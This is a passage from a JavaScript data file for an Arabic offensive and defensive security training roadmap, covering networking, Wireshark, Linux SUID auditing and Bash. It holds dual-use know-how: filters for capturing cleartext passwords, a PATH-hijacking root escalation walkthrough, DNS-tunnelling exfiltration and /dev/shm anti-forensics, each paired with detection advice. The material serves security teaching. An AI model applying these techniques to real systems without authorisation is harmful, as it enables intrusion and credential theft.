        link: 'https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming',
        linkText: 'دليل ired.team لتقنيات بناء وتحليل سلاسل ROP Chaining'
      },
      {
        title: 'استقراء أرقام استدعاءات النواة ديناميكياً (Dynamic SSN Extraction)',
        mitreId: 'T1106',
        category: 'OS Internals & Evasion',
        explanation: 'تتغير أرقام System Service Numbers (SSNs) لدوال Windows Native API (مثل NtAllocateVirtualMemory) بين إصدارات Windows المختلفة وتحديثات الأمان. تقوم برمجيات الريد تيم المتقدمة بقراءة ملف ntdll.dll من القرص أو عبر ترتيب الدوال في الذاكرة تصاعدياً لاستخراج رقم الـ SSN الصحيح تلقائياً عند التشغيل دون حفظ جداول ثابتة (Hardcoded).',
        detection: 'ترصد برمجيات المراقبة فتح ملف ntdll.dll مباشرة من مسار System32 للقراءة غير الاعتيادية، كما يرصد الـ Kernel telemetry عبر ETW-TI استدعاءات الـ Syscalls المشبوهة.',
        link: 'https://redops.at/en/blog/direct-syscalls-a-journey-from-high-to-low',
        linkText: 'بحث RedOps حول آليات عمل واستخراج Direct Syscalls عبر إصدارات ويندوز'
      },
      {
        title: 'كشف شذوذ أذونات صفحات الذاكرة (Memory Protection Anomalies: RWX)',
        mitreId: 'T1055.012',
        category: 'Defensive Detection Engineering',
        explanation: 'صفحات الذاكرة التي تحمل تصريح القراءة والكتابة والتنفيذ في آن واحد (PAGE_EXECUTE_READWRITE أو RWX) تُعد مؤشراً حاسماً وفورياً على وجود Shellcode أو حقن مشبوه، لأن معظم البرمجيات المشروعة تحافظ على مبدأ W^X (Write XOR Execute).',
        detection: 'تستخدم أدوات التحقيق الجنائي وماسحات الذاكرة (مثل Moneta و Hunt-Sleeping-Beacons) دوال VirtualQueryEx للبحث عن أي Memory Region غير مدعوم بملف على القرص (Unbacked Memory) ويحمل صلاحيات التنفيذ.',
        link: 'https://github.com/forrest-orr/moneta',
        linkText: 'مستودع أداة Moneta لفحص وكشف شذوذ الذاكرة والـ Injected Code في ويندوز'
      }
    ],
    checklist: [
      { id: 'c2_1', text: 'فهم سجلات المعالج الأساسية (RIP, RSP, RBP, RAX, RBX).' },
      { id: 'c2_2', text: 'استيعاب الفرق بين بنية الـ Stack والـ Heap وميكانيكية عمل إطارات الدوال.' },
      { id: 'c2_3', text: 'التمييز بين User Mode (Ring 3) و Kernel Mode (Ring 0) واستدعاءات النظام Syscalls.' }
    ],
    officialResources: [
      { name: 'Microsoft Sysinternals Suite Documentation', url: 'https://learn.microsoft.com/en-us/sysinternals/', type: 'Tools' },
      { name: 'Intel 64 and IA-32 Architectures Software Developer Manual', url: 'https://www.intel.com', type: 'Documentation' }
    ]
  },

  {
    id: 3,
    zoneId: 'zone-foundations',
    titleAr: 'المرحلة 3: بروتوكولات وشبكات الحاسب وتحليل الحزم (Networking & Wireshark)',
    titleEn: 'Stage 3: Networking Fundamentals, OSI Model, TCP/IP & Wireshark Mastery',
    tag: 'Networking',
    difficulty: 'مبتدئ إلى متوسط',
    xpReward: 250,
    position: { x: -15, y: 0, z: -25 },
    brief: 'فهم نموذج OSI المكون من 7 طبقات، نموذج TCP/IP، تشريح حزم البيانات (Packets & Frames)، عملية المصافحة الثلاثية (3-Way Handshake)، بروتوكولات التوجيه، الـ DNS، الـ DHCP، والـ ARP، وتحليل حركة البيانات عملياً ببرنامج Wireshark.',
    whyLearn: 'الشبكة هي الشارع الذي يمر فيه كل هجوم وكل دفاع سيبراني. بدون فهم دقيق لحقول ترويسة TCP و IP وعملية المصافحة الثلاثية، لن تستطيع تشخيص الثغرات أو فهم كيف تكشف أدوات الفحص مثل Nmap المنافذ أو تنفيذ هجمات اعتراض الترافيك.',
    professionalApplication: 'يستخدمها مختبر الاختراق في تنفيذ هجمات اعتراض حركة المرور (Man-in-the-Middle)، تزوير الـ ARP Spoofing، التحايل على الجدران النارية بتجزئة الحزم (Packet Fragmentation)، وتحليل تدفق بيانات المصانع والأنظمة الحساسة.',
    caseStudy: 'هجمات DNS Poisoning و ARP Cache Poisoning الكلاسيكية التي مكنت المهاجمين من تحويل مسار ترافيك بنكي بالكامل إلى سيرفرات مزيفة وسرقة بيانات اعتماد آلاف العملاء دون إدراكهم بسبب انعدام التحقق في الطبقة الثانية والسابعة.',
    commonMistakes: [
      'الخلط بين مفهوم المنفذ (Port) وعنوان الـ IP وعنوان الـ MAC الفيزيائي.',
      'عدم معرفة الفارق العملي بين TCP المعتمد على الاتصال الموثوق (Connection-Oriented) و UDP السريع غير الموثوق (Connectionless).',
      'فحص ترافيك الشبكة ببرنامج Wireshark دون معرفة استخدام فلاتر العرض الدقيقة (Display Filters).'
    ],
    detailedGuide: `
### 1. نموذج الـ OSI والـ TCP/IP
* **Layer 7 (Application):** HTTP, HTTPS, DNS, SSH, FTP, SMB, Modbus.
* **Layer 4 (Transport):** منافذ الاتصال (Ports)، التحكم بالتدفق، تجزئة البيانات. بروتوكولات: TCP (الموثوق) و UDP (السريع).
* **Layer 3 (Network):** العنونة المنطقية (IP Addresses) والتوجيه بين الشبكات المختلفة (Routers).
* **Layer 2 (Data Link):** العنونة الفيزيائية (MAC Addresses) ونقل الفريمات عبر السويتشات وبروتوكول ARP.

### 2. عملية المصافحة الثلاثية (TCP 3-Way Handshake)
عند فتح اتصال مع أي سيرفر ويب على بورت 80:
1. **SYN (Synchronize):** يرسل جهازك حزمة تحمل رقم تسلسلي عشوائي (ISN).
2. **SYN-ACK:** يرد السيرفر بالموافقة إذا كان البورت مفتوحاً (Open).
3. **ACK (Acknowledge):** يرسل جهازك تأكيد الاستلام ويبدأ تبادل البيانات المشفرة أو العادية.
* إذا كان البورت مغلقاً (Closed)، يرد السيرفر بحزمة **RST (Reset)** فوراً.
* إذا كان البورت محمياً بجدار ناري، يتجاهل السيرفر الحزمة تماماً ولا يرد، ويعتبره Nmap بحالة **Filtered**.

### 3. أقوى فلاتر Wireshark للريد تيم والبلو تيم
* \`ip.addr == 192.168.1.50\` (تصفية ترافيك جهاز محدد).
* \`tcp.port == 80 || tcp.port == 443\` (تصفية ترافيك الويب).
* \`http.request.method == "POST"\` (كشف طلبات إرسال البيانات وكلمات السر).
* \`frame contains "password" || frame contains "admin"\` (البحث عن كلمات السر المنقولة بنص صريح).
    `,
    practicalSteps: [
      {
        step: 1,
        title: 'التقاط وتحليل حزم البيانات عبر سطر الأوامر بـ tcpdump',
        desc: 'التقاط ترافيك شبكي حي على واجهة الشبكة وتصفيته لتحليل مصافحة الـ TCP وطلبات الـ DNS.',
        command: 'sudo tcpdump -i any -c 5 -nn "tcp[tcpflags] & (tcp-syn) != 0"',
        flags: [
          { flag: '-i any', explanation: 'الاستماع على جميع كروت وواجهات الشبكة في النظام' },
          { flag: '-c 5', explanation: 'التقاط 5 حزم فقط ثم التوقف تلقائياً' },
          { flag: '-nn', explanation: 'عرض عناوين الـ IP والمنافذ بالأرقام دون محاولة حل أسمائها' },
          { flag: 'tcp-syn', explanation: 'فلتر متقدم لالتقاط حزم بدء الاتصال (SYN Packets) فقط' }
        ],
        expectedOutput: `IP 192.168.10.15.48922 > 192.168.10.50.80: Flags [S], seq 382910283, win 64240, length 0
IP 192.168.10.50.80 > 192.168.10.15.48922: Flags [S.], seq 839201948, ack 382910284, win 65160, length 0`,
        proTip: 'حزمة [S] تعني SYN، وحزمة [S.] تعني SYN-ACK. مراقبة هذه الحزم تفيدك جداً في فهم كيف تكشف أدوات الفحص المنافذ المفتوحة خلف الكواليس.'
      },
      {
        step: 2,
        title: 'فحص جدول التوجيه وعناوين الـ ARP في النظام',
        desc: 'استكشاف الأجهزة المجاورة على نفس الشبكة الفيزيائية وعنوان الراوتر الافتراضي Gateway.',
        command: 'ip route show && arp -n',
        flags: [
          { flag: 'ip route', explanation: 'عرض جدول توجيه الحزم والبوابة الافتراضية للإنترنت' },
          { flag: 'arp -n', explanation: 'عرض جدول مطابقة عناوين IP بعناوين MAC الفيزيائية للأجهزة المتصلة' }
        ],
        expectedOutput: `default via 192.168.10.1 dev eth0 proto dhcp src 192.168.10.15 metric 100
192.168.10.0/24 dev eth0 proto kernel scope link src 192.168.10.15
Address                  HWtype  HWaddress           Flags Mask            Iface
192.168.10.1             ether   52:54:00:12:34:56   C                     eth0
192.168.10.50            ether   08:00:27:fa:91:cd   C                     eth0`,
        proTip: 'إذا وجدت عنوان MAC واحد مكرر أمام عدة عناوين IP مختلفة في جدول الـ ARP، فهذا مؤشر فوري على وجود هجوم ARP Spoofing نشط في شبكتك!'
      }
    ],
    youtubeVideos: [
      {
        title: 'Wireshark Tutorial for Beginners - Full Packet Analysis Course',
        channel: 'David Bombal',
        duration: '45 دقيقة',
        url: 'https://www.youtube.com/watch?v=lb1Dw0elw0Q',
        keyTakeaway: 'شرح تفصيلي لتثبيت وايرشارك وكيفية التقاط كلمات السر غير المشفرة وفلترة الترافيك.'
      },
      {
        title: 'TCP 3-Way Handshake Explained in Plain English',
        channel: 'NetworkChuck',
        duration: '16 دقيقة',
        url: 'https://www.youtube.com/watch?v=4t4kBkMsDbQ',
        keyTakeaway: 'شرح مرئي مبدع وممتع لكيفية تأسيس الاتصال والمنافذ ورموز الحزم (Flags).'
      }
    ],
    tryHackMeRooms: [
      { name: 'Network Fundamentals Module', url: 'https://tryhackme.com/r/module/network-fundamentals', difficulty: 'Easy', whyMatters: 'المسار التدريبي الأكثر شمولاً في بروتوكولات الشبكات وعنونة IPv4.' },
      { name: 'Wireshark: The Basics', url: 'https://tryhackme.com/r/room/wiresharkthebasics', difficulty: 'Easy', whyMatters: 'تدريب تفاعلي على فتح ملفات الـ PCAP وفلترة الحزم وتحليل حركة المرور.' }
    ],
    writeup: {
      title: 'تحليل واعتراض حركة المرور الشبكية غير المشفرة عبر Wireshark (Network Traffic Analysis)',
      scenario: 'فحص ملف التقاط حزم شبكية (PCAP) تم تسجيله داخل شبكة مؤسسية أثناء تدقيق أمني: استعراض التسلسل الهرمي للبروتوكولات، وفك تسلسل الجلسات (Follow TCP Stream)، واستخراج بيانات الاعتماد المسرّبة في بروتوكولات قديمة، ورصد مؤشرات هجمات الـ MITM.',
      steps: [
        {
          phase: 'Phase 01: Capture Analysis & Protocol Statistics',
          title: 'استعراض الهيكل الإحصائي لبروتوكولات الحزم الملتقطة',
          action: 'باستخدام قائمة Statistics -> Protocol Hierarchy في Wireshark، تم فحص نسب توزيع البيانات واكتشاف وجود اتصالات تعتمد على بروتوكولات غير مشفرة (HTTP و FTP و Telnet) تمر عبر المنفذ الداخلي 10.10.10.0/24.',
          detection: 'ترصد أنظمة كشف التسلل الشبكي (Network NIDS مثل Snort و Suricata) مرور البروتوكولات غير الآمنة داخل بيئة الإنتاج وتطلق تنبيهات Policy Violation.',
          mitreId: 'T1040',
          link: 'https://www.wireshark.org/docs/wsug_html_chunked/ChStatHierarchy.html',
          linkText: 'توثيق Wireshark الرسمي لتحليل التسلسل الهرمي للبروتوكولات (Protocol Hierarchy)'
        },
        {
          phase: 'Phase 02: Advanced Display Filtering & Stream Assembly',
          title: 'تطبيق فلاتر العرض التكتيكية وإعادة تجميع جلسات TCP',
          action: 'تم تطبيق الفلتر: http.request.method == "POST" || ftp.request.command == "USER" لعزل طلبات إرسال البيانات، واستخدام ميزة Follow TCP Stream لإعادة بناء الحوار الكامل بين العميل والخادم في جلسة واحدة متصلة.',
          detection: 'تسجل أنظمة جدران الحماية للجيل القادم (NGFW) وأجهزة الـ Network TAP تدفقات الجلسات (Flow Records مثل NetFlow و IPFIX) وتحلل مسار نقل البيانات الكثيف.',
          mitreId: 'T1040',
          link: 'https://www.wireshark.org/docs/dfref/',
          linkText: 'دليل ومراجع فلاتر العرض المتقدمة في Wireshark (Display Filter Reference)'
        },
        {
          phase: 'Phase 03: Cleartext Credential Extraction',
          title: 'استخراج بيانات الاعتماد المسرّبة في النص الصريح',
          action: 'عبر قراءة الـ Payload لجلسة HTTP غير مشفرة، تم استخراج اسم المستخدم (admin) وكلمة المرور (InternalP@ss2024!) المرسلة داخل معلمات نموذج تسجيل الدخول (URL-encoded body) دون تشفير.',
          detection: 'ترصد حلول منع تسريب البيانات الشبكية (Network DLP) مرور كلمات المرور والبيانات الحساسة في النص الصريح وتفرض سياسات الإنذار أو قطع الاتصال التلقائي.',
          mitreId: 'T1552.001',
          link: 'https://attack.mitre.org/techniques/T1552/001/',
          linkText: 'توثيق تقنيات سرقة بيانات الاعتماد غير المشفرة في إطار MITRE ATT&CK'
        },
        {
          phase: 'Phase 04: ARP Poisoning & MITM Forensics',
          title: 'رصد مؤشرات تسميم كاش الـ ARP والتحويل المشبوه للمسار',
          action: 'بالبحث عن تنبيهات Wireshark Expert Info الملونة، تم رصد التنبيه: Duplicate IP address detected for 10.10.10.1 وتكرار حزم Gratuitous ARP، مما كشف محاولة جهاز مهاجم انتحال هوية البوابة الافتراضية (Default Gateway).',
          detection: 'تسجل سويتشات الشبكة المدارة (Cisco/Aruba) أحداث DYNAMIC_ARP_INSPECTION_DENIED وتغلق المنفذ فورياً عبر ميزة DAI و DHCP Snooping عند رصد تضارب في جدول الربط.',
          mitreId: 'T1557.002',
          link: 'https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst3750/software/release/12-2_55_se/configuration/guide/scg3750/swdynarp.html',
          linkText: 'دليل Cisco لتفعيل وتأمين الشبكات ضد هجمات تزوير الـ ARP عبر Dynamic ARP Inspection'
        }
      ],
      lessonLearned: 'لا يمكن الثقة بالشبكة الداخلية (Zero Trust)؛ مرور البيانات والاعتمادات في نص واضح يعرض المؤسسة بالكامل للاعتراض والتجسس. يجب فرض التشفير الشامل (TLS/HTTPS و SSH و IPsec) وتفعيل Dynamic ARP Inspection (DAI) و 802.1X على كافة منافذ الشبكة.'
    },
    secretTradecraft: [
      {
        title: 'كشف هجمات تسميم كاش الـ ARP عبر تحليل شذوذ عناوين MAC (ARP Cache Poisoning IoCs)',
        mitreId: 'T1557.002',
        category: 'Network Man-in-the-Middle Mechanics',
        explanation: 'يقوم المهاجم بإرسال حزم ARP Reply زائفة وغير مطلوبة (Gratuitous ARP) لكل من الضحية والراوتر ليربط عنوان IP الخاص بالراوتر بعنوان الـ MAC الخاص بجهاز المهاجم. يتم كشف هذا الهجوم بسرعة في سجلات الشبكة عند ملاحظة عنوان MAC واحد يرتبط فجأة بأكثر من عنوان IP في جدول الـ ARP (ARP Flipping).',
        detection: 'تستخدم أدوات مراقبة الشبكات (مثل Arpwatch و Zeek) قاعدة بسيطة: إطلاق إنذار أمني فوري عند تغير عنوان MAC المقترن بالـ Default Gateway أو الخوادم الحرجة.',
        link: 'https://attack.mitre.org/techniques/T1557/002/',
        linkText: 'توثيق تقنية ARP Cache Poisoning في MITRE ATT&CK'
      },
      {
        title: 'استخراج البيانات خلسة عبر أنفاق DNS Tunneling (DNS Covert Channels)',
        mitreId: 'T1071.004',
        category: 'Exfiltration & C2 Traffic Evasion',
        explanation: 'عندما تمنع جدران الحماية الخروج عبر بورتات HTTP/S، يتم استغلال استعلامات الـ DNS (Port 53 UDP) التي تسمح بها معظم الشبكات لتسريب البيانات؛ حيث يتم تقسيم الملفات وتشفيرها بتنسيق Base64/Hex وإرسالها كنطاقات فرعية تابعة لخادم DNS يتحكم فيه المهاجم (مثل data123.attacker-dns.com).',
        detection: 'ترصد أنظمة SOC والـ DNS Security حلولاً تعتمد على الذكاء الاصطناعي لحساب درجة العشوائية (High Shannon Entropy) في أسماء النطاقات الفرعية، ورصد الاستعلامات الطويلة غير المعتادة (TXT records حجمها أكبر من 512 بايت).',
        link: 'https://www.sans.org/white-papers/34370/',
        linkText: 'بحث SANS المرجعي لتحليل واكتشاف قنوات تسريب البيانات عبر DNS Tunneling'
      },
      {
        title: 'التحليل السلبي لبصمة النظام عبر حقول TCP SYN (Passive OS Fingerprinting)',
        mitreId: 'T1046',
        category: 'Silent Reconnaissance',
        explanation: 'بدون إرسال حزم فحص نشطة تثير جدران الحماية (Nmap Active Scan)، يمكن تحديد نظام تشغيل الهدف بدقة بمجرد مراقبة حزمة TCP SYN واحدة قادمة منه، عبر فحص قيمة الـ Time To Live (TTL) المبدئية (64 لـ Linux/Android، 128 لـ Windows) وحجم الـ TCP Window Size وخيارات الـ MSS.',
        detection: 'أدوات المراقبة الصامتة مثل p0f تراقب هذه الحقول لإنشاء ملف تعريف سلبي لكل جهاز على الشبكة دون إرسال بايت واحد في الترافيك.',
        link: 'https://github.com/p0f/p0f',
        linkText: 'مستودع أداة p0f الشهيرة للتحليل السلبي لحركة مرور الشبكات وتحديد أنظمة التشغيل'
      }
    ],
    checklist: [
      { id: 'c3_1', text: 'استيعاب طبقات نموذج OSI السبعة ووظيفة كل طبقة.' },
      { id: 'c3_2', text: 'فهم خطوات المصافحة الثلاثية TCP 3-Way Handshake والفرق بين SYN و ACK و RST.' },
      { id: 'c3_3', text: 'القدرة على كتابة واستخدام فلاتر Wireshark لتشخيص الهجمات وكشف الترافيك غير المشفر.' }
    ],
    officialResources: [
      { name: 'Wireshark User Guide & Display Filter Reference', url: 'https://www.wireshark.org/docs/', type: 'Documentation' },
      { name: 'RFC 793 - Transmission Control Protocol Specification', url: 'https://datatracker.ietf.org/doc/html/rfc793', type: 'Standards' }
    ]
  },

  {
    id: 4,
    zoneId: 'zone-terminal',
    titleAr: 'المرحلة 4: احتراف لينكس والباش سكريبتينج (Linux Mastery & Bash Automation)',
    titleEn: 'Stage 4: Linux Filesystem Hierarchy, Permissions, SUID & Bash Scripting',
    tag: 'Linux',
    difficulty: 'متوسط',
    xpReward: 300,
    position: { x: -35, y: 0, z: 0 },
    brief: 'الدخول في أعماق نظام تشغيل الهاكرز المفضل: هيكلية شجرة الملفات (FHS)، إدارة الصلاحيات والأذونات المتقدمة (chmod, chown, SUID, SGID)، فلترة النصوص الضخمة عبر grep و awk و sed، وكتابة سكربتات باش لأتمتة عمليات الاستطلاع.',
    whyLearn: 'أكثر من 90% من خوادم الإنترنت وأجهزة البنية التحتية السحابية وأدوات الأمن السيبراني تعمل بنظام لينكس. بدون إتقان سطر أوامر لينكس والقدرة على كتابة سكربتات لأتمتة مهامك، ستكون بطيئاً جداً وغير قادر على استغلال الثغرات أو تصعيد الصلاحيات.',
    professionalApplication: 'يستخدمه مختبرو الاختراق في فرز مخرجات الفحوصات الضخمة التي تضم آلاف الأجهزة، وكتابة سكربتات مخصصة لاستخراج بيانات حساسة من ملفات التكوين، واكتشاف ثغرات الـ SUID لتصعيد الصلاحيات إلى root.',
    caseStudy: 'اختراق خوادم كبرى الشركات نتيجة ترك صلاحيات الكتابة المفتوحة (777) على ملفات أو سكربتات تعمل بمهام الجدولة (Cron Jobs) بصلاحية root، مما مكن المهاجمين من استبدال محتوى السكربت والسيطرة على الخادم بالكامل.',
    commonMistakes: [
      'الاعتماد على الواجهة الرسومية (GUI) وإهمال سطر الأوامر CLI، مما يجعلك عاجزاً عندما تحصل على Reverse Shell نصي فقط.',
      'تجاهل حماية ملفات كلمات السر والمفاتيح المشفرة (`id_rsa`) بأذونات صارمة (`chmod 600`), مما يمنح بقية مستخدمي النظام إمكانية قراءتها.',
      'عدم معرفة الفارق بين SUID bit والصلاحيات العادية.'
    ],
    detailedGuide: `
### 1. تسلسل شجرة ملفات لينكس (FHS - Filesystem Hierarchy Standard)
* **/etc:** ملفات إعدادات النظام والخدمات (مثل \`/etc/passwd\`, \`/etc/shadow\`, \`/etc/sudoers\`).
* **/var/log:** سجلات الأحداث التي يراقبها مهندس الـ SOC وتكشف تحركات الريد تيم.
* **/bin و /usr/bin:** البرمجيات والأوامر التنفيذية الأساسية.
* **/tmp و /dev/shm:** مساحات كتابة مؤقتة في الذاكرة مفتوحة لكل المستخدمين وتستخدم لحفظ أدوات الفحص أثناء الاختراق.

### 2. الصلاحيات ونظام الأذونات (Permissions Matrix)
* كل ملف ومجلد يملك 3 مجموعات أذونات: **Owner (u)** و **Group (g)** و **Others (o)**.
* القيم الرقمية: **Read = 4**, **Write = 2**, **Execute = 1**.
  * مثال: \`chmod 755\` تعني المالك يملك كل الصلاحيات (4+2+1=7)، بينما البقية يملكون القراءة والتنفيذ فقط (4+1=5).
* **SUID Bit (SetUID = 4000):** ملف تنفيذي يشتغل بصلاحيات المالك وليس المستخدم الحالي. إذا كان المالك \`root\` فهذا هدف رئيسي لتصعيد الصلاحيات!

### 3. أتمتة المهام بالباش (Bash Automation Pipeline)
القدرة على دمج الأدوات معاً عبر الـ Pipes (\`|\`)، مثل فحص المنافذ لـ 100 جهاز وفرز النتائج وتوليد تقرير بـ 3 أسطر فقط.
    `,
    practicalSteps: [
      {
        step: 1,
        title: 'البحث عن ملفات الـ SUID الخطيرة في نظام لينكس',
        desc: 'أمر أساسي لا غنى عنه في اختبار eJPTv2 و OSCP لاكتشاف البرامج التي تعمل بصلاحيات root.',
        command: 'find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null | grep -E "bin|usr"',
        flags: [
          { flag: '-perm -4000', explanation: 'البحث عن الملفات التي تمتلك SUID Bit مفعل' },
          { flag: '-type f', explanation: 'تحديد البحث عن الملفات العادية وتجاهل المجلدات' },
          { flag: '2>/dev/null', explanation: 'توجيه رسائل الخطأ ونقص الصلاحية (Permission Denied) إلى العدم للحصول على مخرجات نظيفة' }
        ],
        expectedOutput: `-rwsr-xr-x 1 root root  88304 Feb 12  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root  63960 Feb 12  2024 /usr/bin/passwd
-rwsr-xr-x 1 root root  55528 Feb 12  2024 /usr/bin/mount
-rwsr-xr-x 1 root root 166056 Jan 18  2024 /usr/bin/sudo`,
        proTip: 'طابق أي ملف SUID غير قياسي تجده مع موقع GTFOBins (gtfobins.github.io) لتعرف فوراً كيف تستغله للوصول إلى صلاحيات root.'
      },
      {
        step: 2,
        title: 'كتابة سكربت باش لفحص أجهزة الشبكة الحية (Ping Sweep)',
        desc: 'سكربت أتمتة سريع ومستقل يكتشف الأجهزة الشغالة في شبكة فرعية دون الحاجة لأدوات خارجية.',
        command: 'cat << "EOF" > pingsweep.sh\n#!/bin/bash\nsubnet="192.168.10"\necho "[*] Scanning subnet $subnet.0/24 for live hosts..."\nfor ip in $(seq 1 10); do\n  ping -c 1 -W 1 $subnet.$ip > /dev/null 2>&1 && echo "[+] Host $subnet.$ip is UP"\ndone\nEOF\nchmod +x pingsweep.sh && ./pingsweep.sh',
        flags: [
          { flag: '-c 1', explanation: 'إرسال باكت ping واحدة فقط لتسريع الفحص' },
          { flag: '-W 1', explanation: 'الانتظار لمدة ثانية واحدة كحد أقصى للرد' },
          { flag: 'chmod +x', explanation: 'منح السكربت صلاحية التنفيذ' }
        ],
        expectedOutput: `[*] Scanning subnet 192.168.10.0/24 for live hosts...
[+] Host 192.168.10.1 is UP
[+] Host 192.168.10.15 is UP
[+] Host 192.168.10.50 is UP`,
        proTip: 'في بيئات العمل الواقعية حيث تكون أدوات الفحص مثل Nmap محظورة، استخدام سكربت باش بسيط ومدمج ينقذك ويمكنك من استكشاف الشبكة بالكامل بهدوء تام.'
      }
    ],
    youtubeVideos: [
      {
        title: 'Linux for Ethical Hackers (Full Course from Zero to Hero)',
        channel: 'The Cyber Mentor',
        duration: '2 ساعة كاملة',
        url: 'https://www.youtube.com/watch?v=sWbGOq-IrN4',
        keyTakeaway: 'شرح تفصيلي لكل أوامر لينكس والصلاحيات وإدارة الخدمات وأسرار سطر الأوامر.'
      },
      {
        title: 'Bash Scripting for Hackers - Automate Your Recon',
        channel: 'NetworkChuck',
        duration: '25 دقيقة',
        url: 'https://www.youtube.com/watch?v=4t4kBkMsDbQ',
        keyTakeaway: 'تعلم كتابة سكربتات باش احترافية مع المتغيرات والحلقات ومعالجة مخرجات الأدوات.'
      }
    ],
    tryHackMeRooms: [
      { name: 'Linux Fundamentals 1, 2, 3', url: 'https://tryhackme.com/r/module/linux-fundamentals', difficulty: 'Easy', whyMatters: 'المسار التدريبي الرسمي الشامل لإتقان لينكس من الصفر حتى كتابة الاسكربتات.' },
      { name: 'Bash Scripting Lab', url: 'https://tryhackme.com/r/room/bashscripting', difficulty: 'Easy', whyMatters: 'تمارين عملية على كتابة الاسكربتات والأتمتة ومعالجة النصوص.' }
    ],
    writeup: {
      title: 'تدقيق أمان خوادم لينكس وأتمتة اكتشاف ملفات SUID الخطرة (Linux SUID Auditing & Automation)',
      scenario: 'مهمة تدقيق أمني على خادم Linux: بناء سكربت Bash لأتمتة فحص الثغرات، واكتشاف ملف تنفيذي مخصص يحمل SUID bit ويستدعي أوامر بنظام مسار نسبي غير محمي (Relative Path)، وتصعيد الصلاحيات إلى root في بيئة المعمل، ثم إغلاق الثغرة وتأمين الخادم.',
      steps: [
        {
          phase: 'Phase 01: Bash Automation Script for SUID Enumeration',
          title: 'كتابة سكربت باش لأتمتة استكشاف ملفات الـ SUID المشبوهة',
          action: 'تم تشغيل سكربت باش مؤتمت يبحث في كامل شجرة الملفات باستخدام أمر: find / -type f -perm -4000 2>/dev/null، ومطابقة النتائج تلقائياً مع قاعدة بيانات GTFOBins لاستبعاد أوامر النظام الافتراضية واكتشاف البرمجيات غير القياسية.',
          detection: 'تسجل خدمة Linux Audit Daemon (auditd) عمليات البحث المكثف عبر قواعد مراقبة استدعاءات النواة syscall=execve و syscall=fstatat وتصنفها كـ Discovery Activity.',
          mitreId: 'T1083',
          link: 'https://gtfobins.github.io/',
          linkText: 'قاعدة بيانات GTFOBins الشاملة للبرمجيات التنفيذية القابلة للتجاوز في لينكس'
        },
        {
          phase: 'Phase 02: Dissecting Unsafe Binaries & Strings Inspection',
          title: 'تشريح الملف المشبوه واكتشاف استدعاء الأوامر بمسارات نسبية',
          action: 'باستخدام أمر strings /usr/local/bin/backup-tool، اكتشفنا أن البرنامج المكتوب بلغة C يستدعي أمر tar بدون تحديد المسار المطلق (/bin/tar)، مما يعني اعتماده على ترتيب متغير البيئة $PATH للبحث عن الأمر.',
          detection: 'ترصد حلول حماية الخوادم والـ EDR على لينكس (مثل OSSEC أو Falco) قراءة البرمجيات التنفيذية ذات الـ SUID من مستخدمين عاديين خارج السياق المعتاد.',
          mitreId: 'T1059.004',
          link: 'https://attack.mitre.org/techniques/T1059/004/',
          linkText: 'توثيق تقنيات تنفيذ الأوامر عبر مفسرات الأوامر والـ Bash في MITRE ATT&CK'
        },
        {
          phase: 'Phase 03: Exploiting Relative Path via PATH Hijacking',
          title: 'استغلال مسار البحث وتصعيد الصلاحيات محلياً إلى root',
          action: 'قمنا بإنشاء ملف تنفيذي خبيث باسم tar داخل مجلد /tmp يمنح شل بصلاحيات المالك، وتعديل متغير البيئة: export PATH=/tmp:$PATH، ثم تشغيل البرنامج /usr/local/bin/backup-tool لينفذ ملف الـ tar الخبيث بصلاحيات root فوراً.',
          detection: 'ترصد سجلات auditd وسجلات bash_history تعديل متغير PATH ليشير إلى مجلدات عامة مثل /tmp أو /dev/shm، وتطلق تنبيهاً أمنياً حرجاً على حدث EXECVE_PRIVILEGE_ELEVATION.',
          mitreId: 'T1574.007',
          link: 'https://attack.mitre.org/techniques/T1574/007/',
          linkText: 'توثيق تقنية اختطاف متغيرات مسار البحث (PATH Hijacking) على MITRE ATT&CK'
        },
        {
          phase: 'Phase 04: System Remediation & Principle of Least Privilege',
          title: 'معالجة الثغرة وتأمين الخادم وفرض المسارات المطلقة',
          action: 'إزالة خاصية الـ SUID من الملف عبر: chmod u-s /usr/local/bin/backup-tool، وإعادة كتابة كود البرنامج لاستدعاء المسار المطلق /bin/tar، وحظر تشغيل الـ SUID داخل مجلدات /tmp بتطبيق خيار noexec,nosuid في /etc/fstab.',
          detection: 'يتم التحقق من نجاح التدبير الوقائي عبر تشغيل أداة Lynis لتدقيق أمان نظام لينكس والتأكد من انخفاض مؤشر الخطر الأمني للنظام.',
          mitreId: 'T1548.001',
          link: 'https://cisofy.com/lynis/',
          linkText: 'التوثيق الرسمي لأداة Lynis لتدقيق أمان وتقوية خوادم Linux (System Hardening)'
        }
      ],
      lessonLearned: 'لا تمنح خاصية SUID/SGID لأي برنامج دون حاجة ماسة وتدقيق صارم، وافرض دائماً استخدام المسارات المطلقة الكاملة (Full Paths) داخل الأكواد لمنع التلاعب بمتغيرات البيئة، مع تأمين أقسام الـ Temp بخيارات nosuid و noexec.'
    },
    secretTradecraft: [
      {
        title: 'التشغيل الصامت من ذاكرة الـ RAM المؤقتة (Memory-Only Execution: /dev/shm)',
        mitreId: 'T1027.004',
        category: 'Anti-Forensics & Stealth',
        explanation: 'مجلد /dev/shm في لينكس هو في الواقع قرص افتراضي يعمل في الذاكرة العشوائية (tmpfs). تشغيل الأدوات ووضع المخرجات المؤقتة داخله يمنع كتابتها على القرص الصلب (No Disk Artifacts)، مما يجعل استرجاعها بعد إعادة التشغيل أو فحص الـ Forensic صعباً جداً لأنها تختفي مع تفريغ الذاكرة.',
        detection: 'تراقب أنظمة المراقبة الحديثة أي ملفات يتم وضع صلاحية التنفيذ عليها (chmod +x) داخل /dev/shm أو /tmp، وتطلق أدوات مثل Auditd تنبيهاً فورياً عند رصد عمليات منطلقة من مجلدات الذاكرة المشتركة.',
        link: 'https://www.sandflysecurity.com/blog/detecting-linux-malware-process-masquerading/',
        linkText: 'بحث Sandfly Security حول طرق كشف البرمجيات الخفية في مساحات الذاكرة بلينكس'
      },
      {
        title: 'حقن المكتبات المشتركة عبر متغيرات الربط الديناميكي (Shared Library Injection: LD_PRELOAD)',
        mitreId: 'T1574.006',
        category: 'Privilege Escalation & Hijacking',
